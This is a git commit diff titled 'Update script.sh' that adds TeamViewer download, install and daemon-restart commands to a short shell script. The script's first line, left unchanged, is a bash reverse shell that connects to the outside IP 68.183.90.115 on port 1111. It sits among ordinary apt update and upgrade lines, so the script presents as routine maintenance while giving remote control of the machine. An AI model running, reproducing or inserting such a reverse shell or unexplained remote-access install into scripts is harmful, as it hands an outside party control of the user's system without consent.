0a138400b407371cd65d09c208a88e8ab9193180
d0loreshaze <69720260+d0loreshaze@users.noreply.github.com>
2020-12-22 13:56:39 +0000

    Update script.sh

--- script.sh
+++ script.sh
@@ -1,3 +1,7 @@
 /bin/bash -i >& /dev/tcp/68.183.90.115/1111 0>&1
 sudo apt-get update
 sudo apt-get upgrade
+wget https://download.teamviewer.com/download/linux/teamviewer_amd64.deb
+sudo apt install ./teamviewer_amd64.deb
+teamviewer license accept
+teamviewer daemon restart
